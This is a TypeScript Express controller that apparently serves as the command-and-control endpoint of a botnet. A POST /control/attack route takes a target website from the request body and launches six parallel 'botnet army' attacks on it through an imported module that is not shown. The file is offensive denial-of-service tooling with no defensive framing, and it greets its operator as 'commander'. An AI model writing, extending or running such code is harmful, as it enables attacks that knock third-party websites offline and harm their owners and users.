import {Request, Response, NextFunction} from 'express'
import botnetArmy from '../utils/botnetArmy'
import botnet from '../utils/botnetArmy'

class ControlControllers {

    // [GET] /control
    index(req: Request, res: Response, next: NextFunction) {
        res.status(200).json({
            'status': 'Successfully',
            'message': 'Welcome! Our commander.'
        })
    }

    // [POST] /control/attack
    async attack(req: Request, res: Response, next: NextFunction) {
        try {
            const {websiteTarget} = req.body

            await Promise.all([
               botnetArmy.createArmy(websiteTarget, 6, 15),
               botnetArmy.createArmy(websiteTarget, 6, 15),
               botnetArmy.createArmy(websiteTarget, 6, 15),
               botnetArmy.createArmy(websiteTarget, 6, 15),
               botnetArmy.createArmy(websiteTarget, 6, 15),
               botnetArmy.createArmy(websiteTarget, 6, 15)
            ])

            res.status(200).json({
                status: 'Successfully',
                message: 'All botnet are attacking 💣'

            })
            
        } catch (error) {
            res.status(500).json(error)
        }
    }
}

export default new ControlControllers